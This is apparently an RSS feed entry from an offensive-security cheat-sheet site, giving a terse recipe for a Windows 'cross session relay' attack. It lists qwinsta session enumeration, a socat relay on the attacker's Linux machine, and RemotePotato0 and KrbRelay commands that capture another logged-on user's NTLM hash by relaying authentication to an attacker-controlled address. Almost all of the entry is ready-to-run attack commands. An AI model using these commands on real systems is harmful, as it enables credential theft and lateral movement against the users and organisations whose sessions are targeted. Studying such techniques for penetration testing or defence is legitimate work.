channel.title: Cross Session Relay on TLDRBins
channel.description: Recent content in Cross Session Relay on TLDRBins

item.title: Cross Session Relay
item.description: Display information about the session host Windows qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 Abuse #1: Steal NTLM hash RemotePotato0 KrbRelay # In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.10:9999 # Trigger Attack .\RemotePotato0.exe -m 2 -s <TARGET_SESSION_ID> -x 10.10.14.10 -p 9999 Ref: RemotePotato0 .\KrbRelay.exe -session <TARGET_SESSION_ID> -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm # Or runas .\RunasCs.exe x x -l 9 "C:\ProgramData\KrbRelay.exe -session <TARGET_SESSION_ID> -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm" Ref: KrbRelay
